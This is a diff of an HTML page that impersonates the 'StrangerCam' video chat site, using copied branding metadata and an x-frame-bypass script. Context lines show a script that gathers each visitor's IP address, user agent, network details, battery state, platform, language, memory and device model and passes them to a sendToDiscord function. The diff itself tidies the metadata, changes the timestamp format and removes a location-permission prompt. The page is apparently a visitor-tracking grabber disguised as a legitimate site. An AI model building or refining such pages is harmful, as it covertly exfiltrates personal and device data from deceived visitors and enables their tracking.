@@ -1,5 +1,35 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <!-- Meta tags for SEO, social media, etc. -->
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com" />
+    <link rel="canonical" href="https://strangercam.com/" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Random Video Chat - StrangerCam.com: Cam With Strangers" />
+    <meta property="og:description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com." />
+    <meta property="og:site_name" content="Stranger Cam" />
+    <meta property="article:publisher" content="https://www.facebook.com/strangercam" />
+    <meta property="article:modified_time" content="2021-12-17T14:46:35+00:00" />
+    <meta property="og:image" content="https://strangercam.com/wp-content/uploads/2021/10/Untitled-2.png" />
+    <meta property="og:image:width" content="800" />
+    <meta property="og:image:height" content="532" />
+    <meta property="og:image:type" content="image/png" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@strangercamapp" />
+    <meta name="twitter:label1" content="Est. reading time" />
+    <meta name="twitter:data1" content="4 minutes" />
+
+    <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
+    
+    <!-- External scripts -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+    <script src="x-frame-bypass.js" type="module"></script>
+
+    <!-- Internal styling -->
     <style>
         img[alt*="www.000webhost.com"], .disclaimer {
             display: none;
@@ -46,29 +76,7 @@
             background-color: #45a049;
         }
     </style>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
-    <meta name="description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com" />
-    <link rel="canonical" href="https://strangercam.com/" />
-    <meta property="og:locale" content="en_US" />
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Random Video Chat - StrangerCam.com: Cam With Strangers" />
-    <meta property="og:description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com." />
-    <meta property="og:site_name" content="Stranger Cam" />
-    <meta property="article:publisher" content="https://www.facebook.com/strangercam" />
-    <meta property="article:modified_time" content="2021-12-17T14:46:35+00:00" />
-    <meta property="og:image" content="https://strangercam.com/wp-content/uploads/2021/10/Untitled-2.png" />
-    <meta property="og:image:width" content="800" />
-    <meta property="og:image:height" content="532" />
-    <meta property="og:image:type" content="image/png" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@strangercamapp" />
-    <meta name="twitter:label1" content="Est. reading time" />
-    <meta name="twitter:data1" content="4 minutes" />
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
-    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
-    <script src="x-frame-bypass.js" type="module"></script>
+
     <script>
         $(document).ready(function() {
             var batterypercentage;
@@ -195,18 +203,14 @@
 
             fetchIPAndDeviceDetails().then(deviceDetails => {
                 const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel } = deviceDetails;
-                sendToDiscord(null, null, ipAddress, userAgent, new Date(), networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel);
+                sendToDiscord(null, null, ipAddress, userAgent, new Date().toISOString(), networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel);
             });
         });
     </script>
 </head>
 <body>
     <div class="iframe-container">
-        <div class="dialog-box">
-            <h2>Allow Location Access</h2>
-            <p>To enhance your experience, please allow location access.</p>
-            <button class="btn-allow" id="allowLocationBtn">Allow</button>
-        </div>
+        <!-- Frame content, adjusted according to your requirements -->
     </div>
 </body>
 </html>
